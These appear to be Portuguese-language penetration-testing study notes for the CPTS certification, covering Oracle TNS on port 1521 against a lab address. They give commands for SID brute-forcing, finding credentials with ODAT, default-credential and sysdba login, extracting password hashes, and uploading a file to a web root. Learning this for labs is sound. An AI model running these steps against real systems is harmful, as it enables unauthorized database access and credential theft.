> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/footprinting/oracle-tns-1521.md).

# Oracle TNS - 1521

O servidor `Oracle Transparent Network Substrate`( `TNS`) é um protocolo de comunicação que facilita a comunicação entre bancos de dados Oracle e aplicativos em redes.

* **Nmap**

```sh
sudo nmap -p1521 -sV 10.129.204.235 --open
```

* **Nmap - Força bruta SID**

```sh
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

* **ODAT -** Encontrar credenciais válidas

{% code lineNumbers="true" %}

```sh
sudo apt install odat #Instalar a ferramenta
odat all -s 10.129.204.235
```

{% endcode %}

* **SQLplus - Log In**

```sh
sqlplus scott/tiger@10.129.204.235/XE
```

* Se encontrarmos o seguinte erro `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, execute o comando abaixo :&#x20;

```sh
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

* **Oracle RDBMS - Interaction**

* `select table_name from all_tables;` : Listar todas as tabelas disponiveis&#x20;

* `select * from user_role_privs;`  : Verificar privilégios&#x20;

* **Oracle RDBMS - Database Enumeration**

```sh
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

* **Oracle RDBMS - Extract Password Hashes**

```sql
select name, password from sys.user$;
```

* **Oracle RDBMS - File Upload**

```
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

* Podemos testar se a abordagem de upload de arquivo funcionou com `curl`. Portanto, usaremos uma `GET http://<IP>`solicitação ou podemos visitar via navegador.

```
curl -X GET http://10.129.204.235/testing.txt
```
